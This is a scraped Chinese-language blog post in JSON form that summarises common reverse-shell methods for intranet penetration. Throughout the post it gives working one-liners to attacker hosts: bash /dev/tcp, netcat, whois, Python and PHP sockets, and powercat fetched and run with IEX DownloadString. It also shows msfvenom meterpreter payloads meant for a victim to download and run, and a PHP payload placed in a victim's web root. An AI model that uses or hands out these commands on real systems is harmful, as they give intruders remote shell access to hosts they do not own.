{"blogid": "126558175", "writerAge": "码龄2年", "writerBlogNum": "168", "writerCollect": "295", "writerComment": "20", "writerFan": "251", "writerGrade": "5级", "writerIntegral": "1796", "writerName": "炫彩@之星", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_126558175.jpg", "writerRankTotal": "10758", "writerRankWeekly": "3385", "writerThumb": "43", "writerVisitNum": "91658", "blog_read_count": "490", "blog_time": "于 2022-08-28 00:00:00 发布", "blog_title": "内网渗透-常用反弹shell方法总结", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h1><a id=\"shell_0\"></a>常用反弹shell方法总结</h1>\n<p></p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul><li><a href=\"#shell_0\">常用反弹shell方法总结</a></li><li><a href=\"#_2\">前言</a></li><li><a href=\"#bashshell_3\">bash反弹shell</a></li><li><a href=\"#ncshell_24\">nc反弹shell</a></li><li><ul><li><a href=\"#1nclinuxshell__nc_e_binbash_1111_9999_25\">1.nc弹linux的shell: nc -e /bin/bash 1.1.1.1 9999</a></li><li><a href=\"#2_linuxnce_30\">2. 如果linux中nc没有-e参数</a></li><li><a href=\"#3nc_windowsshell_40\">3.nc 弹windows下的shell:</a></li></ul>\n</li><li><a href=\"#whois_shell_49\">whois 反弹shell</a></li><li><a href=\"#_55\">常见脚本反弹</a></li><li><ul><li><a href=\"#1python_56\">1.python</a></li><li><a href=\"#2php_75\">2.php</a></li></ul>\n</li><li><a href=\"#powercatshell_91\">powercat反弹shell</a></li><li><a href=\"#msfshell_113\">msf反弹shell</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"_2\"></a>前言</h1>\n<h1><a id=\"bashshell_3\"></a>bash反弹shell</h1>\n<p>bash -i &gt;&amp;/dev/tcp/1.1.1.1/9999 0&gt;&amp;1<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\d6f25d89106040e88d8f867ad9523530.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\7558b89801c54f76a68943d7107e34d1.png\"/><br/> 解释：</p>\n<p>bash -i [interface] 表示启动shell窗口</p>\n<p>(&gt;)表示将这个窗口重定向到指定的地方，也就是将输出交给后面</p>\n<p>&amp;表示将该命令转到后台执行 (我看其他文章也有将&amp;解释成等同于的，如2&gt;&amp;1 就表示stderr标准错误重定向为等同于stdout标准输出）</p>\n<p>/dev/tcp/x.x.x.x/port表示发出一个socket调用，建立一个socket连接，读写这个文件等同于socket连接中传输数据.x.x.x.x表示要反弹到的主机的ip,port为端口 （同理linux中还存在/dev/udp）</p>\n<p>0表示stdin标准输入</p>\n<p>1表示stdout标准输出</p>\n<p>2表示stderr标准错误输出</p>\n<p>0&gt;&amp;1表示将标准输入重定向到标准输出</p>\n<h1><a id=\"ncshell_24\"></a>nc反弹shell</h1>\n<h2><a id=\"1nclinuxshell__nc_e_binbash_1111_9999_25\"></a>1.nc弹linux的shell: nc -e /bin/bash 1.1.1.1 9999</h2>\n<p>nc -e 表示连接成功后执行的程序<br/> nc -e /bin/bash表示连接到远程之后执行shell, 并反弹</p>\n<h2><a id=\"2_linuxnce_30\"></a>2. 如果linux中nc没有-e参数</h2>\n<p>（1）nc x.x.x.x 4444 | /bin/bash | nc x.x.x.x 5555#从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e2abe3a57ad54214afa156260f1d6b17.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\770cfd03c88943cc9cbcf3c33c48ad00.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\7f7cdb00a4e44d2ab30b030c4a1546a9.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\4af7a88533ea4b3387f94548558f6048.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\989e90a9b993415d97d6f4edc314d422.png\"/><br/> （2）nc -c /bin/bash x.x.x.x 4444</p>\n<p>（3）/bin/sh | nc x.x.x.x 4444</p>\n<h2><a id=\"3nc_windowsshell_40\"></a>3.nc 弹windows下的shell:</h2>\n<p>windows端需要下载nc.exe 戳这：https://eternallybored.org/misc/netcat/【报毒，建议虚拟机下载】</p>\n<p>攻击机监听：nc -lvp 7777</p>\n<p>windows端反弹shell：nc x.x.x.x 7777 -e c:\\windows\\system32\\cmd.exe<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\db62004ac1ee46b79b2b8480f92ca781.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e024d74fb23a49c5acf3c88182258d54.png\"/></p>\n<h1><a id=\"whois_shell_49\"></a>whois 反弹shell</h1>\n<p>whois -h x.x.x.x -p 9999 <code>whoami</code></p>\n<p>#但是反弹的shell只能执行后面带的命令<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\16969d148a264adbb891bafada668ee6.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\5e326cc88f3b406fa3b24660670cfa05.png\"/></p>\n<h1><a id=\"_55\"></a>常见脚本反弹</h1>\n<h2><a id=\"1python_56\"></a>1.python</h2>\n<blockquote>\n<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“x.x.x.x”,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);’</p>\n</blockquote>\n<p>解释：</p>\n<p>import socket,subprocess,os#导入模块,其中subprocess库用来提供强大的进程创建接口，还可以提供多种与客户端程序交互的方法。</p>\n<p>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #SOCK_STREAM表示创建一个TCP连接</p>\n<p>s.connect((“x.x.x.x”,5555))</p>\n<p>os.dup2(s.fileno(),0)#os.dup2表示将一个文件描述符复制到另一个文件描述符，fileno()表示将文件流指针转换成文件描述符，s.fileno表示返回socket的文件描述符，这行代码表示将s.fileno()表示的文件传递到0指向的文件，0即我们之前所说的stdin标准输入</p>\n<p>os.dup2(s.fileno(),1) #同理，1表示stdout标准输出</p>\n<p>os.dup2(s.fileno(),2)#同理，2表示stderr标准错误输出</p>\n<p>p=subprocess.call([\"/bin/bash\",\"-i\"]); #表示运行/bin/bash -i, subprocess.call执行命令时不使用空格，用\"\"分开</p>\n<h2><a id=\"2php_75\"></a>2.php</h2>\n<p>php -r ‘$sock=fsockopen(“x.x.x.x”,5555);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");’</p>\n<p>【注：php的fsockopen使用需要php.ini中allow_url_fopen = On】</p>\n<blockquote>\n<p>php -r $sock=fsockopen(“x.x.x.x”,5555);<br/> //fsockopen用来打开一个网络连接或者一个Unix套接字连接<br/> exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");<br/> //文件描述符都是递增的，则创建新的文件描述符之后其大小为3，所以直接将0，1，2重定向3。0,1,2的含义我们上文反复提到<br/> //可以写成exec(\"/bin/bash -i 0&lt;&amp;3 1&gt;$3 2&gt;&amp;3\");</p>\n</blockquote>\n<p>还有一些其他脚本反弹shell可以参考乌云滴文章：<br/> https://mp.weixin.qq.com/s/AnvJIRX9hx4g4gg8Er_O4g<br/> 一些文件描述符的理解可以kk这个：<br/> https://zhuanlan.zhihu.com/p/109053744</p>\n<h1><a id=\"powercatshell_91\"></a>powercat反弹shell</h1>\n<p>powercat是netcat的powershell版本，</p>\n<blockquote>\n<p>下载地址：https://github.com/besimorhino/powercat （需要fq）</p>\n</blockquote>\n<p>两种用法：</p>\n<p>（1）下载脚本，powershell本地运行</p>\n<p>Import-Module .\\powercat.ps1</p>\n<p>powercat -c 攻击机IP -p 端口 -e cmd</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\dae72cb667cf43d0865ba112933bcb0a.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\c7d8c5b4b6f14d7c99218e968d3244ed.png\"/><br/> （2）从url下载使用</p>\n<p>powershell运行: (cmd的话命令前面加个powershell一样的)<br/> IEX (New-Object System.Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1’) ; powercat -c 攻击机ip -p 端口 -e cmd</p>\n<p>【这里先下载ps1脚本到自己搭的服务器，再运行powershellIEX (New-Object System.Net.Webclient).DownloadString(‘https://10.x.x.x/powercat.ps1’) ; powercat -c 攻击机ip -p 端口 -e cmd】<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\92e8aa9bc05c4ea3b1b7b695ea38b460.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\65d838505246495ea70071f824900315.png\"/></p>\n<h1><a id=\"msfshell_113\"></a>msf反弹shell</h1>\n<p>这个更常见啦，宝子们应该都会啦~</p>\n<p>进入msf开搞：</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=9999 -f exe &gt; /root/shell.exe<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a841a3101c184f6b833c94dae12ee191.png\"/><br/> 放到自己服务器上让受害者windows主机下载运行</p>\n<p>然后攻击机msf:</p>\n<p>use exploit/multi/handler</p>\n<p>set payload windows/meterpreter/reverse_tcp</p>\n<p>set LHOST 攻击机ip</p>\n<p>set LPORT 9999</p>\n<p>exploit</p>\n<p>看到session<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\28bb471f21f148769261c97558e11262.png\"/><br/> 成功啦~</p>\n<p>当然大家可能已经腻味了熟悉的windows/meterpreter/reverse_tcp，msfvenom也有很多其他反弹shell的payload</p>\n<p>msfvenom -l payload | grep ‘reverse_tcp’<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\30038571cb004541ae3d98e172219fb4.png\"/><br/> 好了我们选中一个幸运payload儿来尝试：<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\dd820e860a8245028f215510438c0ebd.png\"/><br/> 好吧就你了最好的语言</p>\n<p>msfvenom -p php/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=6666 -f raw &gt; shell.php<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\bcaac22387a4467fb22cc4229df733ff.png\"/><br/> 放到受害主机根目录，打开暂时还没有socket：<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ad4ceacecd8940bf8298bd955f430e60.png\"/><br/> 攻击机一顿set, 然后受害主机刷新一下shell.php，成功拿到：<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\1e5d6fa23dcd4d01bcc50005d89535bf.png\"/><br/> 以后想到再更新啦（吐槽：我感觉这才不是大大大总结，是小小小总结）</p>\n<p>推荐一下本站一篇总结的超好的文章：<br/> https://www.freebuf.com/articles/web/247967.html</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 1, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-08-28 00:00:00", "summary": "常用反弹方法总结文章目录常用反弹方法总结前言反弹反弹弹的如果中没有参数弹下的反弹常见脚本反弹反弹反弹前言反弹在这里插入图片描述在这里插入图片描述解释：表示启动窗口表示将这个窗口重定向到指定的地方，也就"}